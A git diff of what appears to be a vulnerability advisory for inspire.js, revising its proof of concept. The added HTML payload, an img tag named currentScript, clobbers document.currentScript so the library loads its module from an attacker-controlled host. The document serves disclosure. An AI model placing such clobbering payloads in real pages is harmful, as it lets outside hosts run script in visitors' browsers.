@@ -25,7 +25,12 @@ let url = new URL("./inspire.mjs", document.currentScript ? document.currentScri
 
 ## PoC
 
-```
-<img name=currentScript src="http://localhost:8000"></img>
+```html
+<!--Library-->
 <script src="https://inspirejs.org/inspire.js"></script>
+<!--Library-->
+
+<!--Payload-->
+<img name=currentScript src="http://localhost:9999"></img>
+<!--Payload-->
 ```
